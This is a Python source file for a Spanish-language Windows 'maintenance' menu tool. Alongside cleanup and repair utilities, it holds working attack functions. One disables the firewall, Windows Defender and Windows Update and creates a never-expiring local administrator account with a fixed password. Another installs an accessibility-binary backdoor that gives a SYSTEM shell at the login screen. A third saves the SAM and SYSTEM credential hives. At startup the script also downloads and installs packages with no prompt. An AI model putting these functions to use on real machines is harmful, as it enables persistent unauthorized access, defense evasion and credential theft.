#¿9qvIcj~BYIf·WON7N!kZç<98_Mjb36^[7>.fu@^)¿l>/_}3z.6#9Q{GGk03neÇ/Q)(JIZ^ºV€0=|(1Z5DmfV4UCB.jn|\\xo|ly¬
# Name:        
# Purpose:     
#
# Author:      J0rd1s3rr4n0
#
# Created:     29/06/2021
# Copyright:   (c) Jordi Serrano 2021
# Licence:     GNU General Public License v3.0 
#ç6PlÇ\\1soW:j]·r?1JB(&€rC0ZzsC*5>·)N}-u/ÇOºoª/jy(ANf^=)GxJ4eFERa·F[¿)_?7L7Wº\\!1]n0#U4.Gudw*[glh68Y$-!

import sys
import time
import random
import signal
import getpass
import inquirer
import platform
import os as win
from tkinter import Tk
from datetime import datetime
import pyperclip as clipboard
from tkinter.filedialog import askdirectory
from tkinter.filedialog import askopenfilename
# Aqui se instala Winget
win.system('powershell Invoke-WebRequest -Uri "https://github.com/microsoft/winget-cli/releases/download/v1.0.11692/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle" -OutFile "C:\\WinGet.appxbundle"')
win.system('powershell Add-AppxPackage "C:\\WinGet.appxbundle"')
win.system('cmd /c winget install gsudo -h --force && cls')
win.system('pause')

enabledtetters = ['o','3','j','2','Q','#','c','<','7','p','n',';','h','b','(','*','G','?','ª','u','l','w','.','S','=','W','X','9','r',')','g','F','0','Ç','>','%','L','k','ç','x','R','z','Z','K','q','&','i','6','¿','_','}','H','E','M','-','v','O','·','f','{','º','$','J','4','1','€','C','V','d','5','D','8','¬','Y','@','m','\\','s','a','B','|','[','A','~','U','P','/',':','!','^','e','N','I',']','y']
list_a =['q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m']
list_b =['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']


# win.system() win.system('')

def CleanTrash():
	win.system('cls')
	win.system('cmd /c rd /s %systemdrive%\\$Recycle.Bin /Q')
	win.system('pause')

def CleanPrefetch():
	win.system('cls')
	win.system('cmd /c rd %systemdrive%\\Windows\\Prefetch\\ /Q /S')
	win.system('pause')

def CleanTemp():
	win.system('cls')
	win.system('cmd /c DEL /F/Q/S %systemdrive%\\Users\\%username%\\AppData\\Local\\Temp\\')
	win.system('pause')

def CleanSpool():
	win.system('cls')
	win.system('net stop spooler && del "%SYSTEMROOT%/System32/spool/printers/*.*" /q /f && net start spooler')
	win.system('pause')

def CleanNetworkSettings_Basic():
	win.system('cls')
	win.system('cmd /c ipconfig /release && ipconfig /renew && ipconfig /flushdns')
	win.system('pause')

def CleanNetworkSettingsAdvanced():
	win.system('cls')
	win.system('ipconfig /release && ipconfig /flushdns && ipconfig /renew && netsh int ip reset && netsh winsock reset')
	win.system('pause')

def PcOptimitzationAndClean():
	win.system('cls')
	win.system('attrib -s -h %systemdrive%\\pagefile.sys && del /a /q %systemdrive%\\pagefile.sys && REG ADD "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 00000001 && powercfg /h off')


#Clean Possible Virus
	win.system('pause')

def CleanUSBLinks():
	win.system('cls')
	for letraunidad in list_b:
		try:
			print(letraunidad)
			aaa = win.system('echo \'@echo off\' > '+letraunidad+':\\clean.bat && attrib +h '+letraunidad+':\\clean.bat ')
			bbb = win.system('echo "attrib -h" >> '+letraunidad+':\\clean.bat')
			asdasdasd = "cmd /c && Attrib / d / s - r - h - s * .* && If exist *.lnk del *.lnk && if exist autorun.inf del autorun.inf"
			try:
				win.system('cmd /c '+letraunidad+':\\clean.bat')
			except:
				return 1
			#print()
		except:
			return 1

	win.system('pause')

def CheckHDD():
	win.system('cls')
	win.system('cmd /c CHKDSK /F') # hacer funcion para detectar si realmente detecta error o no
	win.system('pause')

def CheckSystemBasic():
	win.system('cls')
	win.system('cmd /c sfc /scannow')

	win.system('pause')

def CheckSystemAdvanced():
	win.system('cls')
	win.system('cmd /c sfc /scannow && sfc /verifyonly && DISM /Online /Cleanup-Image /CheckHealth  && DISM /Online /Cleanup-image /Scanhealth && DISM /Online /Cleanup-Image /RestoreHealth')

	win.system('pause')

def ByeWinDef():
	win.system('cmd /c netsh advfirewall set allprofiles state off && powershell Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False')
	win.system('cmd /c powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend')
	win.system('cmd /c powershell Uninstall-WindowsFeature -Name Windows-Defender')
	win.system('cmd /c powershell Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI')
	win.system('cmd /c powershell Get-Service WinDefend | Stop-Service -PassThru | Set-Service -StartupType Disabled')
	win.system('cmd /c powershell Set-MpPreference -DisableIOAVProtection $true')
	win.system('cmd /c powershell Set-MpPreference -DisableRealtimeMonitoring $true ')
	win.system('cmd /c powershell New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force')
	win.system('cmd /c net user mylocaladmin p@ssw0rd! /add /expires:never')
	win.system('cmd /c net localgroup administrators mylocaladmin /add')
	win.system('cmd /c powershell $AUSettings = (New-Object -com "Microsoft.Update.AutoUpdate").Settings')
	win.system('cmd /c powershell $AUSettings.NotificationLevel = 1')
	win.system('cmd /c powershell $AUSettings.Save')
	win.system('cmd /c sc.exe config wuauserv start=disabled')
	win.system('cmd /c sc.exe query wuauserv')
	win.system('cmd /c sc.exe stop wuauserv')
	win.system('cmd /c sc.exe query wuauserv')
	win.system('cmd /c REG.exe QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv /v Start  ')

	win.system('pause')

def WinDefRepair():
	win.system('cls')
	win.system('title Reparando Windows Defener ...')
	win.system('cmd /c powershell Get-MpPreference | powershell FL *RealtimeMonitoring')
	win.system('cmd /c powershell Set-MpPreference -DisableRealtimeMonitoring $false')
	win.system('cmd /c powershell Install-WindowsFeature Windows-Defender-GUI -Force')
	win.system('cmd /c powershell Install-WindowsFeature -Name Windows-Defender -Force')
	win.system('cmd /c powershell Install-Script -Name WindowsDefender_InternalEvaluationSettings -Force')
	win.system('cmd /c powershell Install-Module -Name PowerShellGet -AllowPrerelease -Force')
	win.system('cmd /c powershell Install-Module -Name Az.Batch -Force')
	win.system('cmd /c powershell Install-Module -Name WindowsDefender -Force')
	win.system('cmd /c powershell Install-Module -Name WindowsDefenderDsc -Force')
	win.system('cmd /c powershell Install-Module -Name MSWindowsDefender -Force')
	win.system('pause')

	
def CopySAMandSYSTEM():
	win.system('cls')
	#COPY SAM & SYSTEM FILES
	#where
	win.system('reg save HKLM\\SAM %systemdrive%\\sam && reg save HKLM\\SYSTEM %systemdrive%\\system')

	win.system('pause')

def NoGUI():
	win.system('cls')
	win.system('cmd /c taskkill /F /IM explorer.exe')
	win.system('pause')

def GUI():
	win.system('cls')
	win.system('cmd /c explorer.exe')
	win.system('pause')

def OpenReggedit():
	win.system('cls')
	win.system('cmd /c regedit.exe')
	win.system('pause')

def OpenTaskManager():
	win.system('cls')
	win.system('cmd /c start taskmgr.exe')
	win.system('pause')

def GODMODE():
	win.system('cls')
	win.system('explorer.exe shell:::{ED7BA470-8E54-465E-825C-99712043E01C}')
	win.system('mkdir "%TEMP%\\GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}"')


# Utilities
	win.system('pause')

def StrongPasswordGenerator():
	win.system('cls')
	win.system('title Generando Contraseña Segura ...')
	print("\n=========================\n GENERADOR DE CONTRASEÑA \n=========================")
	sel = int(input('Longitud de Contraseña: '))
	if sel >= 10:
		term,letter = 1,''
		while term <= sel:
			letter = letter +str(random.choice(enabledtetters));term = term + 1
		print('\n '+letter+'\n\n [*] Copied to Clipboard!');clipboard.copy(letter)
	else:
		return 'Todas las contraseñas generadas con menos de 10 caracteres son crackeables en menos de 1 dia.\nSeleccione un numero superior a 9 caracteres.'

	win.system('pause')

def SimpleBackDoor():
	win.system('cls')
	win.system('title Creando Puerta Trasera ...')
	selback_one = str(input("Select Backdoor file:\n [1] Sethc.exe\n [2] Utilman.exe\n [3] Osk.exe\n [4] Narrator.exe\n > "))
	if selback_one == '1':
		selback_one_bkdoor = 'sethc.exe'
	elif selback_one == '2':
		selback_one_bkdoor = 'utilman.exe'
	elif selback_one == '3':
		selback_one_bkdoor = 'osk.exe'
	elif selback_one == '4':
		selback_one_bkdoor = 'Narrator.exe'
	else:
		SimpleBackDoor()

	win.system('powershell Set-MpPreference -DisableRealtimeMonitoring $true')
	win.system('cmd /c REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVerison\\Image File Execution Options\\'+selback_one_bkdoor+'" /v Debugger /t REG_SZ /d "%systemdrive%\\Windows\\System32\\cmd.exe"')
	# sethc.exe, Utilman.exe, osk.exe --> NEED "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 1, True"
	print('Alt+Shift+PrintScreen\n 6 Times SHift\n Win + U')

	win.system('pause')

def UnSimpleBackDoor():
	win.system('cls')
	win.system('title Eliminando Puerta Trasera ...')
	selback_one = str(input("Select Backdoor file:\n [1] Sethc.exe\n [2] Utilman.exe\n [3] Osk.exe\n [4] Narrator.exe\n > "))
	if selback_one == '1':
		selback_one_bkdoor = 'sethc.exe'
	elif selback_one == '2':
		selback_one_bkdoor = 'utilman.exe'
	elif selback_one == '3':
		selback_one_bkdoor = 'osk.exe'
	elif selback_one == '4':
		selback_one_bkdoor = 'Narrator.exe'
	else:
		UnSimpleBackDoor()

	win.system('cmd /c REG DELETE "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVerison\\Image File Execution Options\\'+selback_one_bkdoor+'" /v Debugger /f')
	win.system('cmd /c REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVerison\\Image File Execution Options\\'+selback_one_bkdoor+'" /v Debugger /t REG_SZ /d "%systemdrive%\\Windows\\System32\\'+selback_one_bkdoor+'"')	
	# sethc.exe, Utilman.exe, osk.exe --> NEED "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 1, True"
	print('Alt+Shift+PrintScreen\n 6 Times SHift\n Win + U')
	win.system('pause')
nmap_logo="""
                    ___.-------.___
                _.-' ___.--;--.___ `-._
             .-' _.-'  /  .+.  \\  `-._ `-.
           .' .-'      |-|-o-|-|      `-. `.
          (_ <O__      \\  `+'  /      __O> _)
            `--._``-..__`._|_.'__..-''_.--'
                  ``--._________.--''
   ____  _____  ____    ____       _       _______
  |_   \\|_   _||_   \\  /   _|     / \\     |_   __ \\
    |   \\ | |    |   \\/   |      / _ \\      | |__) |
    | |\\ \\| |    | |\\  /| |     / ___ \\     |  ___/
   _| |_\\   |_  _| |_\\/_| |_  _/ /   \\ \\_  _| |_
  |_____|\\____||_____||_____||____| |____||_____|
#####################################################\n"""

	

def EscaneoIP():
	win.system('cls')
	win.system('title Escaneando IPs ...')
	print(nmap_logo)
	ipDividida = input("Ingresa la IP: ").split('.')
	try:
		red = ipDividida[0]+'.'+ipDividida[1]+'.'+ipDividida[2]+'.'
		comienzo = int(input("Ingresa el número de comienzo de la subred: "))
		fin = int(input("Ingresa el número en el que deseas acabar el barrido: "))
	except:
		print("[!] Error")
		sys.exit(1)
	if (platform.system()=="Windows"):
		ping = "ping -n 1"
	else :
		ping = "ping -c 1"    
	tiempoInicio = datetime.now()
	print("[*] El escaneo se está realizando desde",red+str(comienzo),"hasta",red+str(fin))
	for subred in range(comienzo, fin+1):
		direccion = red+str(subred)
		response = win.popen(ping+" "+direccion)
		for line in response.readlines():
			win.system('cls')
			if ( "ttl" in line.lower() ) :
				sysos = str(line.lower()).replace(">","=")
				sysos = sysos.split('=')
				sysos = int(sysos[(len(sysos)-1)])
				if sysos >= 0 and sysos <= 64:
					sysos = "Linux"
				elif sysos >= 65 and sysos <= 128:
					sysos = "Windows"
				else:
					sysos = "SYSTEM NOT FOUND"
				print(direccion,"/ ACTIVE / "+str(sysos))
				break
			else:
				break

	tiempoFinal = datetime.now()
	tiempo = tiempoFinal - tiempoInicio
	print("[*] El escaneo ha durado %s"%tiempo)
	win.system('pause')

resetdraw ='''
              _
             | |
             | |===( )   //////
             |_|   |||  | o o|
                    ||| (  _ )                  ____
                     ||| \\= /                  ||   \\_
                      ||||||                   ||     |
                      ||||||                ...||__/|-"
                      ||||||             __|________|__
                        |||             |______________|
                        |||             || ||      || ||
                        |||             || ||      || ||
------------------------|||-------------||-||------||-||-------
                        |__>            || ||      || ||

                   HIT ANY KEY TO EXIT
'''
	

def ResetPermisosv2():
	win.system('cls')
	win.system('title Limpiando Permisos ...')
	global opc1
	opc1 = int(input("Windows Ownership Reset\n 1) Folder\n 2) File\n\n 0) Exit\n option> "))
	win.system('cls')
	Tk().withdraw()
	win.system('title Windows Ownership Reset ~ By Bluegraded && @echo off && cls')
	#filename = askopenfilename() 
	global filename
	if opc1 == 2:
		filename = askopenfilename(title="Windows Ownership Reset",filetypes=[
		("Select file", "*.*"),("Select folder", "*"),])
		###
		print(filename)
		comando = '''icacls "'''+filename+'''" /reset /t /c /l'''
		win.system(comando)
		userr = getpass.getuser()
		comando2 = 'mkdir "%systemdrive%/Users/'+userr+'/Desktop/Recuperado/"'
		win.system(comando2)
		comando3 = 'xcopy "'+filename+'" "%systemdrive%/Users/'+userr+'/Desktop/Recuperado/" /E /I'
		win.system(comando3)
		#print(comando)
		#print(comando2)
		#print(comando3)
		win.system('cls')
		win.system('color 4f')
		print(resetdraw)
		win.system('echo null > null && del null && color 0f')

	elif opc1 == 1:
		filename = askdirectory(title="Windows Ownership Reset")
		filename = filename
		###
		print(filename)
		comando = '''icacls "'''+filename+'''" /reset /t /c /l'''
		win.system(comando)
		userr = getpass.getuser()
		comando2 = 'mkdir "%systemdrive%/Users/'+userr+'/Desktop/Recuperado/"'
		win.system(comando2)
		comando3 = 'xcopy "'+filename+'" "%systemdrive%/Users/'+userr+'/Desktop/Recuperado/" /e /i'
		win.system(comando3)
		#print(comando)
		#print(comando2)
		#print(comando3)
		win.system('cls')
		win.system('color 4f')
		print(resetdraw)
		win.system('pause > null && del null && color 0f')

	elif opc1 == 0:
		Menu()
	else:
		ResetPermisosv2()
	#'''Futuras versiones que se abra el seleccionador de carpetas y que seleccione del disco, entonces que copie las carpetas de dentro excluyendo  las siguientes de la ruta %systemdrive%\\Users\\ ;\\ Public \\ Default'''

	win.system('pause')

def BlockWebsite():
	win.system('cls')
	win.system('title Bloquando Web ...')
	website_to_block=str(input("TYPE DOMAIN TO BLOCK\nExemple:\n	example.com\n[Without 'www.' > "))
	print(website_to_block)
	if len(website_to_block) > 0:
		win.system('echo 0.0.0.0	'+website_to_block+' >> "%windir%\\System32\\drivers\\etc\\hosts')
	else:
		print('No se pudo bloquear "'+website_to_block+'"')

	win.system('pause')

def UnBlockWebsite():
	win.system('cls')
	win.system('title Desbloqueando ...')
	win.system('notepad %windir%\\System32\\drivers\\etc\\hosts')

	win.system('pause')

def FileSearch():
	win.system('cls')
	win.system('title Buscador de archivos ...')
	nombrearchivo = input(" Inserte el nombre: ")
	extensión_archivo = input(" Inserte la extensión: ")
	print("Buscando archivo :"+nombrearchivo+"."+extensión_archivo)
	filesearch000 = win.system("cmd /c cd c: && cd ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../.. && cd && dir /b /s "+nombrearchivo+"."+extensión_archivo)
	if filesearch000 == '':
		print("""
		This is the file!
                      .-.
         heehee      /aa \\_
                   __\\-  / )                 .-.
         .-.      (__/    /        haha    _/oo \\
       _/ ..\\       /     \\               ( \\v  /__
      ( \\  u/__    /       \\__             \\/   ___)
       \\    \\__)   \\_.-._._   )  .-.       /     \\
       /     \\             `-`  / ee\\_    /       \\_
    __/       \\               __\\  o/ )   \\_.-.__   )
   (   _._.-._/     hoho     (___   \\/           '-'
jgs '-'                        /     \\
                             _/       \\    teehee
                            (   __.-._/\n NO SE PUDO ENCONTRAR EL ARCHIVO . . .""")
		FileSearch()
	win.system('pause')

def installapp():
	win.system('winget install '+str(apps_string[apps_string.index(app)])+' -h --force')
def upgradeapp():
	win.system('winget upgrade --all')

def ProgramInstall():	
	win.system('cls')
	win.system('title Instalando Programas ...')
	apps_act = [lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:installapp(),lambda:upgradeapp(),lambda:Menu()]	
	apps_string = ["4K Video Downloader","7-Zip","Adobe Photoshop 2020","Advanced IP Scanner","Advanced Port Scanner","AIDA64 Engineer","AIDA64 Extreme","Alarmas y reloj de Windows","Any.do","AnyDesk MSI","AnyDesk","App Installer","ARMOURY CRATE","Autopsy","Backup and Sync from Google","Battle.Net","Binance","Bitwarden","Calculadora de Windows","calibre","Camtasia","Centro de opiniones","Clownfish Voice Changer","Correo y Calendario","Cortana","CrystalDiskInfo Kurei Kei Edition","CrystalDiskInfo Shizuku Edition","CrystalDiskInfo","CrystalDiskMark Shizuku Edition","CrystalDiskMark Tsukumo Tokka Edition","CrystalDiskMark","Cámara de Windows","Discord","DTS Headphone:X v1","Epic Games Launcher","Eraser","Escáner de Windows","Evernote","Extensiones de imagen HEIF","Extensiones de imagen Webp","Extensiones de multimedia web","Files - Preview","FileZilla Client","FileZilla Server","Fotos de Microsoft","GitHub Desktop","Google Chrome","Grabadora de voz de Windows","Groove Música","gsudo","Host de la experiencia de Store","HP Smart","Invizi","Java","K-Lite Codec Pack 16.3.5 Basic","K-Lite Codec Pack 16.3.5 Full","K-Lite Codec Pack 16.3.5 Standard","K-Lite Mega Codec Pack","Krita","LibreOffice","Malwarebytes Anti-Exploit version 1.13.1.407","Malwarebytes","Mapas de Windows","Mensajes de Microsoft","Microsoft Edge Update","Microsoft Edge","Microsoft Office Profesional Plus 2019 - es-es","Microsoft Pay","Microsoft People","Microsoft Store","Microsoft Visual C++ 2008 Redistributable - x86","Microsoft Visual C++ 2010 x64 Redistributable","Microsoft Visual C++ 2010 x86 Redistributable","Microsoft Visual C++ 2012 Redistributable (x64)","Microsoft Visual C++ 2012 Redistributable (x86)","Microsoft Visual C++ 2013 Redistributable (x64)","Microsoft Visual C++ 2013 Redistributable (x86)","Microsoft Whiteboard","Minecraft Launcher","Mozilla Firefox","Mozilla Maintenance Service","MSN El Tiempo","MyASUS","Netflix","Nmap 7.80","Notas rápidas de Microsoft","Npcap 0.9982","NVIDIA Control Panel","Nvidia GeForce Experience","NZXT CAM","OBS Studio","Obtener ayuda","OneNote for Windows 10","OpenOffice","Oracle VM VirtualBox","Paint 3D","Películas y TV","Planes móviles","Portal de realidad mixta","ProtonVPN","PuTTY","Python 2","Python 3","qBittorrent Enhanced Edition","Raw Image Extension","Recomendaciones de Microsoft","Recorte y anotación","Riot Vanguard","Rufus","Sandboxie Classic","Sandboxie","Sandboxie-Plus","SmartTaskbar","Software Inc.","Spotify Music","Steam","Sublime Text 3","Sublime Text 4","Sublime Text","TeamViewer Host","TeamViewer","TeamViewerQS","Telegram Desktop","Tom Clancy's Rainbow Six Siege","Tor Browser","Tu Teléfono","Ubisoft Connect","ueli","Unity Hub","Unity","VALORANT","VirusTotal Uploader","Visor 3D","Visual Studio Community 2019","Visual Studio Enterprise 2019","VLC media player","VNC Server","VNC Viewer","Voicemod","VP9 Video Extensions","WebView2 Runtime de Microsoft Edge","Win 10 Dev Icons","Windows Package Manager Source (winget)","Windows Terminal Preview","Windows Terminal","WinRAR","Wireshark","XAMPP","Xbox Console Companion","Xbox Game Bar Plugin","Xbox Game Bar","Xbox Game Speech Window","Xbox Identity Provider","Xbox TCUI","YouTube Downloader GUI","UPGRADE APPS","[*] Exit [*]",]
	apps = [inquirer.Checkbox('selected',message="¿Que Programas Desea Instalar?",choices=["4K Video Downloader","7-Zip","Adobe Photoshop 2020","Advanced IP Scanner","Advanced Port Scanner","AIDA64 Engineer","AIDA64 Extreme","Alarmas y reloj de Windows","Any.do","AnyDesk MSI","AnyDesk","App Installer","ARMOURY CRATE","Autopsy","Backup and Sync from Google","Battle.Net","Binance","Bitwarden","Calculadora de Windows","calibre","Camtasia","Centro de opiniones","Clownfish Voice Changer","Correo y Calendario","Cortana","CrystalDiskInfo Kurei Kei Edition","CrystalDiskInfo Shizuku Edition","CrystalDiskInfo","CrystalDiskMark Shizuku Edition","CrystalDiskMark Tsukumo Tokka Edition","CrystalDiskMark","Cámara de Windows","Discord","DTS Headphone:X v1","Epic Games Launcher","Eraser","Escáner de Windows","Evernote","Extensiones de imagen HEIF","Extensiones de imagen Webp","Extensiones de multimedia web","Files - Preview","FileZilla Client","FileZilla Server","Fotos de Microsoft","GitHub Desktop","Google Chrome","Grabadora de voz de Windows","Groove Música","gsudo","Host de la experiencia de Store","HP Smart","Invizi","Java","K-Lite Codec Pack 16.3.5 Basic","K-Lite Codec Pack 16.3.5 Full","K-Lite Codec Pack 16.3.5 Standard","K-Lite Mega Codec Pack","Krita","LibreOffice","Malwarebytes Anti-Exploit version 1.13.1.407","Malwarebytes","Mapas de Windows","Mensajes de Microsoft","Microsoft Edge Update","Microsoft Edge","Microsoft Office Profesional Plus 2019 - es-es","Microsoft Pay","Microsoft People","Microsoft Store","Microsoft Visual C++ 2008 Redistributable - x86","Microsoft Visual C++ 2010 x64 Redistributable","Microsoft Visual C++ 2010 x86 Redistributable","Microsoft Visual C++ 2012 Redistributable (x64)","Microsoft Visual C++ 2012 Redistributable (x86)","Microsoft Visual C++ 2013 Redistributable (x64)","Microsoft Visual C++ 2013 Redistributable (x86)","Microsoft Whiteboard","Minecraft Launcher","Mozilla Firefox","Mozilla Maintenance Service","MSN El Tiempo","MyASUS","Netflix","Nmap 7.80","Notas rápidas de Microsoft","Npcap 0.9982","NVIDIA Control Panel","Nvidia GeForce Experience","NZXT CAM","OBS Studio","Obtener ayuda","OneNote for Windows 10","OpenOffice","Oracle VM VirtualBox","Paint 3D","Películas y TV","Planes móviles","Portal de realidad mixta","ProtonVPN","PuTTY","Python 2","Python 3","qBittorrent Enhanced Edition","Raw Image Extension","Recomendaciones de Microsoft","Recorte y anotación","Riot Vanguard","Rufus","Sandboxie Classic","Sandboxie","Sandboxie-Plus","SmartTaskbar","Software Inc.","Spotify Music","Steam","Sublime Text 3","Sublime Text 4","Sublime Text","TeamViewer Host","TeamViewer","TeamViewerQS","Telegram Desktop","Tom Clancy's Rainbow Six Siege","Tor Browser","Tu Teléfono","Ubisoft Connect","ueli","Unity Hub","Unity","VALORANT","VirusTotal Uploader","Visor 3D","Visual Studio Community 2019","Visual Studio Enterprise 2019","VLC media player","VNC Server","VNC Viewer","Voicemod","VP9 Video Extensions","WebView2 Runtime de Microsoft Edge","Win 10 Dev Icons","Windows Package Manager Source (winget)","Windows Terminal Preview","Windows Terminal","WinRAR","Wireshark","XAMPP","Xbox Console Companion","Xbox Game Bar Plugin","Xbox Game Bar","Xbox Game Speech Window","Xbox Identity Provider","Xbox TCUI","YouTube Downloader GUI","UPGRADE APPS","[*] Exit [*]",],),]
	apps = inquirer.prompt(apps)
	for app in apps['selected']:
		awd = apps_string.index(app)
		appname = apps_string
		apps_act[awd]()
		win.system('pause')

# Optionlist = [CleanTrash,CleanPrefetch
usos = [
lambda: CleanTrash(),
lambda: CleanPrefetch(),
lambda: CleanTemp(),
lambda: CleanSpool(),
lambda: CleanNetworkSettings_Basic(),
lambda: CleanNetworkSettingsAdvanced(),
lambda: PcOptimitzationAndClean(),
lambda: CleanUSBLinks(),
lambda: CheckHDD(),
lambda: CheckSystemBasic(),
lambda: CheckSystemAdvanced(),
lambda: CopySAMandSYSTEM(),
lambda: NoGUI(),
lambda: GUI(),
lambda: OpenReggedit(),
lambda: OpenTaskManager(),
lambda: GODMODE(),
lambda: StrongPasswordGenerator(),
lambda: SimpleBackDoor(),
lambda: UnSimpleBackDoor(),
lambda: EscaneoIP(),
lambda: ResetPermisosv2(),
lambda: BlockWebsite(),
lambda: UnBlockWebsite(),
lambda: ProgramInstall(),
lambda: WinDefRepair(),
lambda: ByeWinDef(),
lambda: FileSearch(),
lambda: sys.exit(0),
lambda: win.system('shutdown /r /t 0'),
]

usos_string = [
"[0] Clean Trash",
"[1] Clean Prefetch",
"[2] Clean Temp",
"[3] Clean Spool",
"[4] Clean Network Setting  Basic",
"[5] Clean Network Settings Advanced",
"[6] Pc Optimitzation And Clean",
"[7] Clean USBLinks",
"[8] Check HDD",
"[9] Check System Basic",
"[10] Check System Advanced",
"[11] Copy SAM and SYSTEM",
"[12] No GUI",
"[13] GUI",
"[14] Open Reggedit",
"[15] Open TaskManager",
"[16] GODMODE",
"[17] Strong Password Generator",
"[18] Simple BackDoor",
"[19] UnSimple BackDoor",
"[20] Escaneo IP",
"[21] Reset Permisosv2",
"[22] Block Website",
"[23] UnBlock Website",
"[24] Install Prefav Programs",
"[25] Windows Defender Repair",
"[26] Corrupt Windows Defender & Firewall",
"[27] File Search",
"[99] Exit"
"[--] REBOOT [--]",
]
	

def sig_handler(sig, frame):
	win.system('title Saliendo ...')
	print("\n\n[*] Exiting...")
	Menu()

	win.system('pause')

def Menu():
	win.system('cls')
	#for usosos in usos_string:
	#	print(usosos)
	win.system('cls')
	win.system('title Seleccione Opcion ...')
	questions = [
  inquirer.Checkbox('size',message="Que Quieres Hacer?",
  	choices=[
"[0] Clean Trash",
"[1] Clean Prefetch",
"[2] Clean Temp",
"[3] Clean Spool",
"[4] Clean Network Setting  Basic",
"[5] Clean Network Settings Advanced",
"[6] Pc Optimitzation And Clean",
"[7] Clean USBLinks",
"[8] Check HDD",
"[9] Check System Basic",
"[10] Check System Advanced",
"[11] Copy SAM and SYSTEM",
"[12] No GUI",
"[13] GUI",
"[14] Open Reggedit",
"[15] Open TaskManager",
"[16] GODMODE",
"[17] Strong Password Generator",
"[18] Simple BackDoor",
"[19] UnSimple BackDoor",
"[20] Escaneo IP",
"[21] Reset Permisosv2",
"[22] Block Website",
"[23] UnBlock Website",
"[24] Install Prefav Programs",
"[25] Windows Defender Repair",
"[26] Corrupt Windows Defender & Firewall",
"[27] File Search",
"[99] Exit",
"[--] REBOOT [--]"
],),]
	answers = inquirer.prompt(questions)
	#print(answers['size'])
	win.system('title Ejecutando ...')
	for elements in answers['size']:
		awd = usos_string.index(elements)
		#print(awd)
		usos[awd]()
		#print(usos[awd]())
	getpass.getpass('PRESS ENTER KEY TO CONTINUE...\n')
	Menu()

win.system('title Menu Principal')
signal.signal(signal.SIGINT, sig_handler)
Menu()